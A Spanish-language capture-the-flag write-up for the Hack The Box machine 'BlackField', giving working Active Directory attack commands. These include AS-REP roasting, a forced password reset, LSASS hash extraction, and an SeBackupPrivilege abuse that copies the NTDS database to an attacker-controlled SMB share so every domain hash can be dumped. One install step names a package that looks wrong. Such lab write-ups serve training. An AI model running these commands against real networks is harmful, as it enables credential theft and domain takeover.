---
title: "BlackField"
description: "Guia completa paso a paso de como resolver la maquina BlackField de Hack The Box"
date: 2026-04-12
creator: "HTB"
rating: 4.9 
dificultad: "Dificil"
author: "Ghxstsec"
draft: false
type: "post"
---

Bueno como siempre comenzaremos con la enumeracion, yo usare un escaneo de nmap:

```
sudo nmap -p- -Pn -n -min-rate 5000 -sCV -T5 -v -oN targeted blackfield.local
```

![Blackfield](/images/writeups/blackfield/1)

Bueno, lo unico interesante que se puede ver por aqui es el SMB, asi que con NetExec lo analizaremos:

```
nxc smb blackfield.local -u 'guest' -p '' --shares
```

![Blackfield](/images/writeups/blackfield/2)

Podemos ver un share llamado "profiles$", vamos a ver que hay dentro

![Blackfield](/images/writeups/blackfield/3)

Podemos ver archivos sin nada dentro con posibles nombres de usuarios, asi que usaremos estos usuarios para crearnos una lista para enumerar usuarios AS-REP Roastables:

```
grep -E '^[A-Za-z0-9]' users | awk '{print $1}' > usuarios.txt
```

Con el comando de arriba yo me hice la lista de usuarios, la lista cruda la saque del mismo output del "dir" de smbclient

nos quedara algo asi:

![Blackfield](/images/writeups/blackfield/4)

y con esa lista enumeramos usuarios AS-REP Roastables:

```
impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.229.17 \
    -usersfile usuarios.txt \
    -request \
    -format hashcat \
    -outputfile asreproastables.hashes \
    -no-pass
```

![Blackfield](/images/writeups/blackfield/5)

Ahi tendriamos un hash, para crackearlo yo usare john-the-ripper porque no tengo tarjeta grafica dedicada, si tienes es preferible usar hashcat

![Blackfield](/images/writeups/blackfield/6)

Pues tenemos un usuario en el dominio victima, hora de ejecutar bloodhound, Yo uso bloohound CE

conseguimos el digest:

```
bloodhound-python -u support -p "#00^BlackKnight" -d blackfield.local -ns 10.129.229.17 -c All --zip
```

Lo subiremos a nuestro cliente bloodhound y veremos esto:

![Blackfield](/images/writeups/blackfield/7)

![Blackfield](/images/writeups/blackfield/8)

Asi que con BloodyAD cambiaremos la contrasena del usuario "audit2020"

```
bloodyAD --host 10.129.229.17 \
         -d blackfield.local \
         -u support \
         -P #00^BlackKnight \
         set password audit2020 "pass@123"
```
![Blackfield](/images/writeups/blackfield/9)

una vez la contrasena cambiada iremos a enumerar los shares que tiene disponibles este usuario:

```
nxc smb blackfield.local -u 'audit2020' -p 'pass@123' --shares
```

![Blackfield](/images/writeups/blackfield/10)

podemos ver un share llamado "forensic", por tal de ahorraros tiempo, una vez dentro del share con smbclient:

```
smbclient -U audit2020 //blackfield.local/forensic
```

Podremos ver la carpeta mas importante: memory_analysis, en la cual encontraremos un archivo llamado lsass.zip

![Blackfield](/images/writeups/blackfield/11)

![Blackfield](/images/writeups/blackfield/12)

Asi que lo descargamos: 

![Blackfield](/images/writeups/blackfield/13)

lo extraeremos y lo abriremos con pypykatz:

![Blackfield](/images/writeups/blackfield/14)

y asi conseguiremos el hash NT del usuarios "svc_backup"

![Blackfield](/images/writeups/blackfield/15)

Asi que volveremos a bloodhound para ver esto:

![Blackfield](/images/writeups/blackfield/16)

tiene un diamante, es admin? Seguramente sea por los permisos, pero veamos esto:

![Blackfield](/images/writeups/blackfield/17)

Tiene acceso por winrm, veamos que tal:

![Blackfield](/images/writeups/blackfield/18)

tenemos pwned, pero ya os adelanto que no es admin al completo, vamos a iniciar sesion y conseguiremos la primera flag:

![Blackfield](/images/writeups/blackfield/19)

Asi que vamos a por la escalada, veremos los privilegios del usuario:

![Blackfield](/images/writeups/blackfield/20)

Primero leeremos el archivo notes.txt del Desktop del Administrator:

```
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

![Blackfield](/images/writeups/blackfield/21)

Asi que esta sera la escalada:

Escalada de Privilegios: Explotación de SeBackupPrivilege

Esta fase describe el compromiso total del Dominio mediante la extracción de la base de datos de Active Directory.

# 1. Fase de Preparación (Máquina Atacante)
Para recibir y procesar los datos, necesitamos configurar un servidor SMB y herramientas de montaje de discos virtuales.

### A. Configuración de Samba:
Editamos /etc/samba/smb.conf para permitir conexiones anónimas de escritura:

```
[global]
    map to guest = Bad User
    server role = standalone server
    interfaces = tun0
    bind interfaces only = yes

[smb]
    path = /tmp/
    guest ok = yes
    read only = no
    writable = yes
    force user = root
Comando para reiniciar: sudo systemctl restart smbd
```


### B. Instalación de dependencias:

```
sudo apt update && sudo apt install libguestfs-tools imbalanced-secretsdump -y
```

Habilitar lectura del kernel para guestmount

```
sudo chmod +r /boot/vmlinuz-*
```

# 2. Fase de Explotación (Máquina Víctima - Evil-WinRM)
### A. Verificación de privilegios

```
whoami /priv
```
 Resultado esperado: SeBackupPrivilege Enabled

### B. Extracción del NTDS mediante Backup de Windows:

Usamos wbadmin porque crea automáticamente una Shadow Copy, permitiendo leer el archivo ntds.dit aunque esté en uso por el sistema.

```
echo "Y" | wbadmin start backup -backuptarget:\\<IP_ATACANTE>\smb -include:c:\windows\ntds
```

### C. Extracción de la llave de cifrado (SYSTEM Hive):
Sin el hive SYSTEM, no podemos extraer los hashes del .dit.

```
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
download C:\Windows\Temp\system.bak
```

# 3. Fase de Post-Procesamiento (Máquina Atacante)
El backup de Windows genera un archivo .vhdx en nuestro directorio /tmp/.

### A. Montaje del disco virtual:
Primero identificamos la partición y luego montamos:

```
virt-filesystems -a /tmp/WindowsImageBackup/DC01/Backup_.../uuid.vhdx
```

# Montar manualmente la partición de datos

```
mkdir /tmp/mnt_backup

guestmount -a /tmp/WindowsImageBackup/DC01/Backup_.../uuid.vhdx -m /dev/sda1 --ro /tmp/mnt_backup
```

### B. Extracción y Limpieza:

```
cp /tmp/mnt_backup/Windows/NTDS/ntds.dit .
sudo umount /tmp/mnt_backup
```


# 4. Fase Final: Cracking de Hashes
Finalmente, usamos secretsdump.py para volcar todos los hashes de la base de datos.

```
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

Y asi conseguiremos el hash del Administrador:

![Blackfield](/images/writeups/blackfield/22)

Y podremos leer la flag de root.

![Blackfield](/images/writeups/blackfield/23)
















